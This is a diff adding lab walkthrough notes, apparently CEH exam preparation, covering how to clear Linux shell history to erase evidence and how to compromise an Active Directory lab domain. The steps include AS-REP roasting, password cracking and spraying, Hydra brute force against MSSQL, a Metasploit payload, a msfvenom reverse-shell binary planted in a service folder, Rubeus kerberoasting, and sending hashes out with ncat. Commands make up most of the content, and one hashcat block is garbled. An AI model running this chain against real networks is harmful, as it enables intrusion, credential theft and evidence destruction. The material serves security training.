@@ -1035,5 +1035,171 @@ It’s basically a wrapper around the OpenAI API.
     - Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery
 
 * Clear Linux Machine Logs using the BASH Shell :~
-  -       
+  - switch to the Parrot Security machine
+  - export HISTSIZE=0 (command to disable the BASH shell from saving the history)  
+  - history -c (command to clear the stored history)
+  - history -w (command to delete the history of the current shell)
+  - shred ~/.bash_history (command to shred the history file, making its content unreadable)
+  - more ~/.bash_history (command to view the shredded history content)
+  - ctrl+z (to stop viewing the shredded history content)
+  - shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit (This command first shreds the history file, then deletes it, and finally clears the evidence of using this command)
+</details>
+
+<details>
+<summary>Perform Active Directory (AD) Attacks Using Various Tools</summary>
+
+* Perform Initial Scans to Obtain Domain Controller IP and Domain Name :~
+  - Terminal 
+  - sudo su 
+  - cd command to jump to the root directory
+  - nmap 10.10.1.0/24 (command to scan the entire subnet and identify the DC IP address)
+  - nmap shows that host 10.10.1.22 has port 88/TCP kerberos-sec and port 389/TCP LDAP opened which confirms that our DC IP address is 10.10.1.22
+  - nmap -A -sC -sV 10.10.1.22 
+  - we get the domain name which is CEH.com
+
+* Perform AS-REP Roasting Attack :~
+  - Terminal 
+  - sudo su 
+  - cd command to jump to the root directory  
+  - cd impacket/examples/ 
+  - Python script to retrieve AD user information:
+    ```console
+        python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
+    ``` 
+       - GetNPUsers.py: Python script to retrieve AD user information
+       - CEH.com/: Target AD domain
+       - -no-pass: Flag to find user accounts not requiring pre-authentication
+       - -usersfile ~/ADtools/users.txt: Path to the file with the user account list
+       - -dc-ip 10.10.1.22: IP address of the DC to query  
+  - We can observe that the user Joshua has DONT_REQUIRE_PREAUTH set. As this user is vulnerable to AS-REP roasting, we obtain Joshua's password hash
+  - Copy that hash and save it as joshuahash.txt
+  - echo '[HASH]' > joshuahash.txt
+  - crack the password hash and will give us the password in plain text
+    ```console
+         john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
+    ```
+  - The password for the user Joshua has been cracked - cupcake
+
+* Spray Cracked Password into Network using CrackMapExec :~
+  - Terminal 
+  - sudo su 
+  - cd command to jump to the root directory
+  - from the Nmap results we can observe that other hosts in the subnet are running services such as RDP, SSH, and FTP
+  - we can perform password spraying on each service individually to check for correct credentials
+    ```console
+        cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake" (perform password spraying)
+    ```    
+       - rdp: Targets the Remote Desktop Protocol (RDP) service
+       - 10.10.1.0/24: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0
+       - -u /root/ADtools/users.txt: Specifies the path to the file containing user accounts for authentication
+       - -p "cupcake": Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts 
+  - After the spray completion we find that user Mark is using the same password cupcake on host 10.10.1.40
+  - elect Remmina and open it and enter IP address 10.10.1.40 to connect (10.10.1.40 is the IP address
+  - Enter RDP authentication credentials
+  - A Remote Desktop connection will be successfully established
+  - Minimize the Remmina window.
+
+* Perform Post-Enumeration using PowerView :~
+  - cd /root/ADtools (move into the ADtools folder)
+  - we will attempt post-enumeration to gather additional information about the AD
+  - For enumeration purposes, we will utilize the PowerView.ps1 script
+  -  python3 -m http.server to start the HTTP server
+  - return to Remmina where our RDP session is active
+  - navigate to the URL http://10.10.1.13:8000/PowerView.ps1 
+  - launch PowerShell 
+  - Navigate to the Downloads folder by running the command cd Downloads
+  - powershell -EP Bypass
+  - .\PowerView.ps1
+  - Get-NetComputer (command in PowerShell. This command will display all the information related to computers in AD)
+  - Get-NetGroup (in PowerShell. The Get-NetGroup command in PowerView lists all groups in AD)
+  - Get-NetUser in PowerShell. Get-NetUser in PowerView retrieves detailed information about AD user accounts,such as usernames and group memberships
+  - we found a new user SQL_srv
+  - PowerView.ps1 for enumeration:
+    - Get-NetOU - Lists all organizational units (OUs) in the domain
+    - Get-NetSession - Lists active sessions on the domain
+    - Get-NetLoggedon - Lists users currently logged on to machines
+    - Get-NetProcess - Lists processes running on domain machines
+    - Get-NetService - Lists services on domain machines
+    - Get-NetDomainTrust - Lists domain trust relationships
+    - Get-ObjectACL - Retrieves ACLs for a specified object
+    - Find-InterestingDomainAcl - Finds interesting ACLs in the domain
+    - Get-NetSPN - Lists service principal names (SPNs) in the domain
+    - Invoke-ShareFinder - Finds shared folders in the domain
+    - Invoke-UserHunter - Finds where domain admins are logged in
+    - Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines
+
+* Perform Attack on MSSQL service :~
+  - We will attempt to brute force the password using Hydra, as we already know the username, which is SQL_srv
+  - Terminal 
+  - sudo su  
+  - Save the username SQL_srv in a text file and name it as user.txt using command pluma user.txt
+  - to brute force the MSSQL service password
+    ```console
+        hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql                  
+    ```
+  - We have successfully cracked the password for SQL_srv, which is "batman"
+  - we will attempt to log into the service using mssqlclient.py
+  - python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
+  - SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
+  - we know that xp_cmdshell is enabled on SQL server we can use Metasploit to exploit this service. Type exit
+  - open msfconsole
+    ```console
+        use exploit/windows/mssql/mssql_payload
+        set RHOST 10.10.1.30
+        et USERNAME SQL_srv
+        set PASSWORD batman
+        set DATABASE master
+        exploit
+    ```
+
+* Perform Privilege Escalation :~
+  - WinPEASx64.exe = tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation
+  - we will use WinPEAS.exe to enumerate any misconfigurations
+  - We will upload the WinPEAS.exe file and execute it in Windows
+  - Move to C:\ using the command cd C:\
+  - move to C:\Users\Public\Downloads using cd and execute the command powershell
+  - we need to host winPEASx64.exe on the attacker machine using Python
+  - sudo su
+  - cd /root/ADtools
+  - python3 -m http.server (host the winPEASx64.exe file)
+  - Get back to the shell terminal and type
+    ```console
+        wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
+    ```
+  - ./winpeas.exe
+  - Open a new terminal with root privileges using the command sudo su and toor as password
+  - msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
+  - Get back to our shell terminal and move to C:\Program Files\CEH Services
+  - cd ../../.. ; cd "Program Files/CEH Services"
+  - move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe
+  - nc -nvlp 8888
+  - assuming we are the victim now. Restart the machine by hovering over Power and Display button and click Reset/Reboot button present at the toolbar located above the virtual machine and log in with the username SQL_srv and password "batman."
+  - we got the shell to our netcat listener
+  
+* Perform Kerberoasting Attack :~
+  - In the netcat shell, execute the powershell command to launch PowerShell
+  - cd ../.. ; cd Users\Public\Downloads (Navigate to C:\Users\Public\Downloads)
+  - we will be downloading Rubeus and netcat:
+    ```console
+        wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
+    ```
+  - Once the tools are downloaded type exit
+  - cd ../.. && cd Users\Public\Downloads (move into the Download directory)
+  - rubeus.exe kerberoast /outfile:hash.txt
+  - After kerberoasting the password hash for DC-Admin is saved in hash.txt file
+  - Open a new terminal, type sudo su and press Ente
+  - nc -lvp 9999 > hash.txt
+  - ncat.exe -w 3 10.10.1.13 9999 < hash.txt
+  - Get back to the netcat listener terminal and press Enter to save the file
+  - we will be using HashCat to crack the password hash
+    ```console
+        we will be using HashCat to crack the password hash
+    ```
+       - -m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes
+       - --force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. Use this with caution, as it might cause instability or incorrect results
+       - -a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is
+       - hash.txt: is the input file containing the hashes to crack
+       - /root/ADtools/rockyou.txt: is the wordlist file used for the attack  
+  - we get the password advanced!
+  - As DC-Admin has high privileges on the domain, we can use this password for further attacks                     
 </details>
